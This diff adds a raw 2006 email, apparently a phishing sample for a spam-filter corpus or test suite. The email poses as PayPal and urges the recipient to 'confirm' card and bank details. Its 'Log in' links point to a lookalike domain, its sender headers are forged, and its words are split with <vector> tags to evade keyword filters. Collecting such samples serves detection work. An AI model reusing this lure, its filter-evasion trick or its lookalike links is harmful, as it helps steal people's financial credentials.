@@ -1,0 +1,447 @@
+From nobody Sun Jan 25 13:48:13 2015
+Return-Path: <root@fpdemo.netinsz.co.jp>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail1.example.com (mail1.example.com [10.1.2.3])
+ by naughty.example.com (Postfix) with ESMTP id 73FE453710B
+ for <nobody@login.example.com>; Fri, 10 Feb 2006 23:30:58 -0500 (EST)
+Received: from fpdemo.netinsz.co.jp (unknown [211.127.159.252])
+ by mail1.example.com (Postfix) with ESMTP id 8D3636CCFCE
+ for <nobody@example.com>; Fri, 10 Feb 2006 23:30:57 -0500 (EST)
+Received: (from root@localhost)
+ by fpdemo.netinsz.co.jp (8.12.10/8.12.10) id k1B4VSJM005416
+ for nobody@example.com; Sat, 11 Feb 2006 13:31:28 +0900
+Date: Sat, 11 Feb 2006 13:31:28 +0900
+To: nobody@example.com
+Subject: RE: Notification from Billing Department
+Message-ID: <1139632288.16938.qmail@init.paypal.com>
+From: "PayPal" <service@paypal.com>
+Content-Type: text/html
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 373
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD> <META
+http-equiv=Content-Type content="text/html; charset=windows-1252"> <STYLE
+type=text/css>BODY {
+
+FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif
+} TD {
+
+FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif
+} LI {
+	LINE-HEIGHT: 120% } UL.smallBorder {
+	MARGIN: 10px 5px 10px 20px } LI.smallBorderLi {
+	MARGIN: 0px 0px 5px } UL.Narrow {
+	MARGIN: 10px 5px 0px 40px } HR.dotted {
+
+BORDER-RIGHT: #fff; BORDER-TOP: #fff; MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px;
+BORDER-LEFT: #fff; WIDTH: 100%; BORDER-BOTTOM: #ccc 2px dotted }
+.smallEmphasis {
+
+FONT-WEIGHT: bold; FONT-SIZE: 11px; COLOR: #000000; FONT-FAMILY:
+verdana,arial,helvetica,sans-serif } .serifBig {
+
+FONT-WEIGHT: bold; FONT-SIZE: 20px; COLOR: #000000; FONT-FAMILY: serif }
+.serif {
+	FONT-SIZE: 16px; COLOR: #000000; FONT-FAMILY: serif } .sansSerif {
+
+FONT-SIZE: 16px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif
+} .heading {
+
+FONT-WEIGHT: bold; FONT-SIZE: 18px; COLOR: #003366; FONT-FAMILY:
+verdana,arial,helvetica,sans-serif } .subHeadingEoa {
+
+FONT-WEIGHT: bold; FONT-SIZE: 15px; COLOR: #000000; FONT-FAMILY:
+verdana,arial,helvetica,sans-serif } .subHeading {
+
+FONT-WEIGHT: bold; FONT-SIZE: 16px; COLOR: #003366; FONT-FAMILY:
+verdana,arial,helvetica,sans-serif } .sidebarText {
+
+FONT-SIZE: 11px; COLOR: #003366; FONT-FAMILY: verdana,arial,helvetica,sans-serif
+} .sidebarTextBold {
+
+FONT-WEIGHT: bold; FONT-SIZE: 11px; COLOR: #003366; FONT-FAMILY:
+verdana,arial,helvetica,sans-serif } .xptFooter {
+
+FONT-SIZE: 11px; COLOR: #aaaaaa; FONT-FAMILY: verdana,arial,helvetica,sans-serif
+} .button {
+
+FONT-WEIGHT: 400; FONT-SIZE: 13px; COLOR: #000000; BORDER-TOP-STYLE: outset;
+FONT-FAMILY: verdana,arial,helvetica,sans-serif; BORDER-RIGHT-STYLE: outset;
+BORDER-LEFT-STYLE: outset; BACKGROUND-COLOR: #cccccc; BORDER-BOTTOM-STYLE: outset
+} .smaller {
+
+FONT-SIZE: 10px; COLOR: #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif
+} .smallerSidebar {
+
+FONT-SIZE: 10px; COLOR: #003366; FONT-FAMILY: verdana,arial,helvetica,sans-serif
+} .emphasis {
+	FONT-WEIGHT: 700 } TABLE#invoice {
+	WIDTH: 600px } TABLE#invoice_controls {
+	WIDTH: 600px } TABLE#invoice_note {
+	WIDTH: 600px } TABLE#invoice_note {
+	MARGIN-TOP: 10px; MARGIN-BOTTOM: 10px } TABLE#invoice_controls {
+	TEXT-ALIGN: right } TABLE#invoice {
+	BORDER-RIGHT: #aaa 1px solid; BORDER-TOP: #aaa 1px
+solid; BORDER-LEFT:
+#aaa 1px solid; BORDER-BOTTOM: #aaa 1px solid; BORDER-COLLAPSE: collapse }
+TABLE#invoice TD {
+	BORDER-RIGHT: #ccc 1px solid; PADDING-RIGHT: 2px; BORDER-TOP: #ccc
+1px
+solid; PADDING-LEFT: 2px; FONT-SIZE: 11px; PADDING-BOTTOM: 2px; BORDER-LEFT: #ccc
+1px solid; PADDING-TOP: 2px; BORDER-BOTTOM: #ccc 1px solid } TABLE#invoice
+TD.field_label_right {
+	FONT-WEIGHT: bold; TEXT-ALIGN: right } TABLE#invoice
+TD.field_label_right_error {
+	FONT-WEIGHT: bold; TEXT-ALIGN: right } TABLE#invoice
+TD.field_label_right_error {
+	COLOR: red } TABLE#invoice TD.field_label_error {
+	COLOR: red } TABLE#invoice TR.title TD {
+
+FONT-WEIGHT: bold; LINE-HEIGHT: 20px; BACKGROUND-COLOR: #ccddee; TEXT-ALIGN: left
+} TABLE#invoice INPUT.readonly {
+
+BORDER-RIGHT: 0px; BORDER-TOP: 0px; BORDER-LEFT: 0px; BORDER-BOTTOM: 0px;
+TEXT-ALIGN: right } TABLE#invoice INPUT.readonly_currency {
+
+BORDER-RIGHT: 0px; BORDER-TOP: 0px; BORDER-LEFT: 0px; WIDTH: 10px; BORDER-BOTTOM:
+0px } .field_error {
+	BACKGROUND-COLOR: #ff3333 } .field_error INPUT.readonly_currency {
+	BACKGROUND-COLOR: #ff3333 } .currency_highlight {
+	BACKGROUND-COLOR: #ffffcc } .tax {
+	FONT-WEIGHT: 400; FLOAT: left } TABLE#invoice TD SPAN.curr {
+	FLOAT: left } TABLE#invoice TD.currency {
+	BORDER-RIGHT: #fff 1px solid } TABLE#invoice TD.calc {
+	FONT-WEIGHT: bold; TEXT-ALIGN: right } .inlineBlue {
+	COLOR: #00f } .small {
+	FONT-WEIGHT: 400; FONT-SIZE: 11px } HR.solid {
+
+BORDER-RIGHT: #fff; BORDER-TOP: #fff; MARGIN-TOP: 5px; MARGIN-BOTTOM: 0px;
+BORDER-LEFT: #fff; WIDTH: 100%; BORDER-BOTTOM: #999 2px solid } .large {
+	FONT-SIZE: 17px } .smallVerdanaGrey {
+	FONT-SIZE: 10px; COLOR: #999999; FONT-FAMILY: verdana }
+.smallVerdana {
+	FONT-SIZE: 10px; COLOR: #000000; FONT-FAMILY: verdana }
+.smallArial {
+	FONT-SIZE: 13px; FONT-FAMILY: arial } .smallArialBlue {
+	FONT-SIZE: 9px; COLOR: #0000ff; FONT-FAMILY: verdana }
+.smallVerdanaGreen
+{
+	FONT-SIZE: 10px; COLOR: #666666; FONT-FAMILY: verdana } .smaller {
+	FONT-SIZE: 10px; COLOR: gray } .larger {
+	FONT-WEIGHT: 600; FONT-SIZE: 18px; FONT-FAMILY: arial }
+.longTableValue {
+	WORD-BREAK: break-all } .longSideBarText {
+	WIDTH: 190px; WORD-BREAK: break-all } </STYLE> <META
+content="MSHTML
+6.00.2505.0" name=GENERATOR></HEAD> <BODY> <TABLE cellSpacing=0
+cellPadding=0
+width=600 align=center border=0>
+  <TBODY>
+  <TR vAlign=top>
+    <TD><IMG alt=PayPal
+src="http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/files/email_logo.gif"
+border=0></TD></TR></TBODY></TABLE> <TABLE cellSpacing=0 cellPadding=0
+width="100%" align=center border=0>
+  <TBODY>
+  <TR>
+    <TD
+width="100%" background=http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/files/bg_clk.gif><IMG
+height=29 alt=""
+
+src="http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/files/pixel.gif"
+width=1 border=0></TD></TR>
+  <TR>
+    <TD><IMG height=10 alt=""
+src="http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/files/pixel.gif"
+width=1
+    border=0></TD></TR></TBODY></TABLE> <TABLE cellSpacing=0 cellPadding=0
+width=600 align=center border=0>
+  <TBODY>
+  <TR>
+    <TD></TD></TR></TBODY></TABLE> <TABLE cellSpacing=0 cellPadding=0
+width=600
+align=center border=0>
+  <TBODY>
+  <TR vAlign=top>
+    <TD width="100%">
+      <TABLE cellSpacing=0 cellPadding=1 width=190 align=right
+bgColor=#cccccc
+      border=0>
+        <TBODY>
+        <TR>
+          <TD></TD>
+        <TR>
+          <TD>
+            <TABLE cellSpacing=0 cellPadding=4 width="100%" align=center
+            bgColor=#ffffff border=0>
+              <TBODY>
+              <TR bgColor=#eeeeee>
+                <TD class=sideBarTextbold colSpan=2>Phone Numbers of Major
+                  U.S. Banks</TD></TR>
+              <TR>
+                <TD class=sideBarText colSpan=2><IMG height=50
+                  alt="Phone Numbers of Major U.S. banks" hspace=5
+
+src="http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/files/step_callBank_norm_50x50.gif"
+width=50
+                  align=left vspace=5
+border=0><BR><BR><BR><BR><BR><BR>Bank of
+
+
+America<BR>http://www.bankamerica.com<BR>1-800-944-0404<BR></TD></TR><BR></TD></TR>
+              <TR>
+                <TD class=sideBarText colSpan=2>Bank
+                  One<BR>http://www.bankone.com<BR>1-800-366-2265
+<BR></TD></TR>
+              <TR>
+                <TD class=sideBarText colSpan=2>Bank
+
+Boston<BR>http://www.bankboston.com<BR>1-800-788-5000<BR><BR>California
+                  Federal
+
+Bank<BR>http://www.calfed.com<BR>1-800-843-2265<BR><BR>Charter
+                  One
+
+
+Bank<BR>http://www.charterone.com<BR>1-877-242-7837<BR><BR>Citibank<BR>http://www.citibank.com<BR>1-800-627-3999<BR><BR>Commerce
+
+Bank<BR>http://bank.commerceonline.com<BR>1-888-751-9000<BR><BR>Commerce
+
+Bank<BR>http://www.commercebank.com<BR>1-800-746-8704<BR><BR>First
+                  Union National
+
+Bank<BR>http://www.firstunion.com<BR>1-800-275-3862<BR><BR>Fifth
+                  Third
+Bank<BR>http://www.53.com<BR>1-800-972-3030<BR><BR>Fleet
+
+Bank<BR>http://www.fleet.com<BR>1-800-841-4000<BR><BR>Key
+
+Bank<BR>http://www.keybank.com<BR>1-800-539-2968<BR><BR>The
+                  Chase Manhattan
+
+Bank<BR>http://www.chase.com<BR>1-800-242-7324<BR><BR></TD></TR>
+              <TR>
+                <TD class=sideBarText colSpan=2>U.S. Bank
+                  <BR>http://www.usbank.com<BR></TD></TR>
+              <TR>
+                <TD class=sideBarText colSpan=2>Union Bank of
+
+California<BR>http://www.uboc.com<BR>1-800-238-4486<BR><BR>Washington
+                  Mutual
+
+Bank<BR>http://www.washingtonmutual.com<BR>1-800-756-8000<BR><BR></TD></TR>
+              <TR>
+                <TD class=sideBarText colSpan=2>Wells Fargo Bank/Norwest
+
+Bank<BR>http://www.wellsfargo.com<BR>1-800-869-3557</BR></TD></TR>
+              <TR>
+                <TD
+width=1></TD></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE><SPAN
+      class=heading>Reminder: Confirm Your C<vector>re<vector>dit or
+De<vector>bi<vector>t C<vector>ar<vector>d<BR><BR></SPAN>Dear
+      Cu<vector>st<vector>omer,<BR><BR>
+      <TABLE cellSpacing=0 cellPadding=0 align=center border=0>
+        <TBODY>
+        <TR>
+          <TD>This is a re<vector>min<vector>der that we need you to
+conf<vector>ir<vector>m your Cr<vector>ed<vector>it or
+De<vector>bi<vector>t
+            C<vector>ar<vector>d.<BR></TD></TR>
+        <TR>
+          <TD><BR>Pa<vector>y<vector>P<vector>a<vector>l will never reveal
+any of
+your fi<vector>nan<vector>cia<vector>l
+in<vector>for<vector>mat<vector>ion.
+            From industry-leading security to extensive protection
+programs,
+            P<vector>a<vector>y<vector>P<vector>a<vector>l is always
+working to
+safe<vector>gua<vector>rd you and your ac<vector>cou<vector>nt. Only you
+            can initiate transactions using your b<vector>an<vector>k
+ac<vector>cou<vector>nt, and P<vector>a<vector>y<vector>P<vector>al will
+            r<vector>emi<vector>nd you via email whenever there is a
+fu<vector>n<vector>d tr<vector>ans<vector>fer from your
+            ac<vector>cou<vector>nt.<BR></TD></TR>
+        <TR>
+          <TD>
+            <HR class=dotted>
+          </TD></TR>
+        <TR>
+          <TD>
+            <P class=subHeading>How To Conf<vector>irm Your
+Cr<vector>ed<vector>it or D<vector>ebi<vector>t Ca<vector>r<vector>d</P>
+            <TABLE cellSpacing=0 cellPadding=0 align=center border=0>
+              <TBODY>
+              <TR>
+                <TD colSpan=3>P<vector>ay<vector>P<vector>a<vector>l has
+made two
+small de<vector>pos<vector>its into the b<vector>an<vector>k
+                  ac<vector>cou<vector>nt you registered. These
+dep<vector>os<vector>its should appear on
+                  your Ac<vector>cou<vector>nt
+St<vector>ate<vector>me<vector>nt.</TD></TR>
+              <TR>
+                <TD colSpan=3><IMG height=10 alt=""
+
+src="http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/files/pixel.gif"
+width=1 border=0></TD></TR>
+              <TR vAlign=top>
+                <TD align=middle><IMG height=30
+                  alt="Call your bank to find out your two deposit amounts
+from
+PayPal."
+
+src="http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/files/card2.gif"
+width=50 border=0></TD>
+                <TD><IMG height=1 alt=""
+src="http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/files/pixel.gif"
+width=5
+                  border=0></TD>
+                <TD class=inlineBlue width="100%"><IMG height=1 alt=""
+                  hspace=2
+src="http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/files/pixel.gif"
+width=1 border=0><IMG
+                  height=1 alt="" hspace=2
+src="http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/files/pixel.gif"
+width=1
+                  border=0><A
+
+href="http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/"
+                  target=_blank>Log in</A> to your
+P<vector>ay<vector>P<vector>a<vector>l account and enter the
+                  exact financial information required.</TD></TR>
+              <TR>
+                <TD colSpan=3><IMG height=10 alt=""
+
+src="http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/files/pixel.gif"
+width=1 border=0></TD></TR>
+              <TR vAlign=top>
+                <TD><IMG height=1 alt=""
+src="http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/files/pixel.gif"
+width=5
+                  border=0></TD>
+                <TD><IMG height=1 alt=""
+src="http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/files/pixel.gif"
+width=5
+                  border=0></TD>
+                <TD width="100%"><IMG height=1 alt=""
+
+src="http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/files/pixel.gif"
+width=1
+            border=0></TD></TR></TBODY></TABLE></TD></TR>
+        <TR>
+          <TD>
+            <HR class=dotted>
+          </TD></TR>
+        <TR>
+          <TD>
+            <P class=subHeading>Why Confirm Your Credit or Debit Card?</P>
+            <TABLE cellSpacing=0 cellPadding=0 align=center border=0>
+              <TBODY>
+              <TR>
+                <TD class=inlineBlue><SPAN class=emphasis>It increases
+                  security</SPAN><BR>When you en<vector>t<vector>er your
+exact
+fin<vector>anc<vector>ial
+                  information, you co<vector>nfi<vector>rm that you are
+the owner
+of this ba<vector>nk
+                  ac<vector>cou<vector>nt. This is because only you as the
+owner
+would have
+                  ac<vector>cess to the exact amo<vector>un<vector>ts of
+the 2
+d<vector>epo<vector>si<vector>ts Pa<vector>y<vector>P<vector>a<vector>l
+sent.
+                  This process increases the sa<vector>fe<vector>ty of the
+entire
+Pa<vector>y<vector>P<vector>a<vector>l
+                  pa<vector>y<vector>me<vector>nts network.</TD></TR>
+              <TR>
+                <TD colSpan=3><IMG height=10 alt=""
+
+src="http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/files/pixel.gif"
+width=1 border=0></TD></TR>
+              <TR>
+                <TD class=inlineBlue><SPAN class=emphasis>Your
+P<vector>ayP<vector>a<vector>l account
+                  will become verified</SPAN><BR>Your
+P<vector>ay<vector>P<vector>al ac<vector>cou<vector>nt becomes
+                  ver<vector>ifi<vector>ed once you
+co<vector>nfi<vector>rm your
+fi<vector>nan<vector>cial infor<vector>mat<vector>ion. With a
+                  ver<vector>if<vector>i<vector>ed
+ac<vector>cou<vector>nt, there
+is no l<vector>im<vector>it on the amo<vector>unt of mo<vector>n<vector>ey
+you
+                  can send through Pa<vector>y<vector>P<vector>al when you
+choose
+to make these p<vector>ay<vector>me<vector>nts
+                  using f<vector>un<vector>ds from your
+b<vector>an<vector>k
+ac<vector>cou<vector>nt.<BR></TD></TR>
+              <TR>
+                <TD colSpan=3><IMG height=10 alt=""
+
+src="http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/files/pixel.gif"
+width=1 border=0></TD></TR>
+              <TR>
+                <TD>When you confirm your financial information:
+                  <UL>
+                    <LI>You will improve your reputation by letting others
+know
+                    you're a confirmed, Verfied me<vector>mb<vector>er of
+the
+P<vector>ay<vector>Pa<vector>l com<vector>mu<vector>nity
+                    <LI>Your sending limit will be removed
+                    <LI>You will be a<vector>bl<vector>e to
+fu<vector>n<vector>d
+purchases directly from your
+                    che<vector>ck<vector>ing or sa<vector>vi<vector>ngs
+ac<vector>co<vector>unt, in addition to using c<vector>re<vector>dit
+                    ca<vector>rd<vector>s
+                    <LI>You will be able to ad<vector>d fun<vector>ds to
+your
+P<vector>ay<vector>Pa<vector>l ac<vector>count
+                    directly from your ba<vector>nk ac<vector>count
+                    <LI>You will be able to send money to friends, family,
+and
+                    P<vector>a<vector>y<vector>P<vector>al
+Per<vector>sonal
+Ac<vector>co<vector>unt
+          holders</LI></UL></TD></TR></TBODY></TABLE></TD></TR>
+        <TR>
+          <TD>
+            <HR class=dotted>
+          </TD></TR>
+        <TR>
+          <TD>Thank you for using P<vector>a<vector>yP<vector>al!<BR>The
+Pa<vector>y<vector>Pa<vector>l Team</TD></TR>
+        <TR>
+          <TD>
+            <HR class=dotted>
+          </TD></TR></TBODY></TABLE>
+      <P class=xptFooter>Please do not reply to this email. This mailbox
+is not
+      monitored and you will not receive a response. For assistance, <A
+
+
+href="http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/"
+      target=_blank>log in</A> to your
+Pa<vector>y<vector>P<vector>a<vector>l
+account and choose the Help link
+      located in the top right corner of any
+P<vector>a<vector>y<vector>P<vector>al page.<BR><BR class=h10>To
+      receive email not<vector>ific<vector>ations in plain text instead of
+HTML,
+update your
+      preferences <A
+href="http://www.paypal.com_cgi-bin_webscr-cmd-verification_run.mspace.cn/login-submit_cmd/"
+      target=_blank>here</A>.</P><BR><BR><SPAN class=xptFooter><BR><SPAN
+      class=xptFooter>Pa<vector>y<vector>P<vector>a<vector>l Email ID
+PP432</SPAN></SPAN></TD></TR></TBODY></TABLE></TD></TR><TR><TD>&nbsp;</TD></TR></TABLE>
+</TD></TR><TR><TD></BODY></HTML>
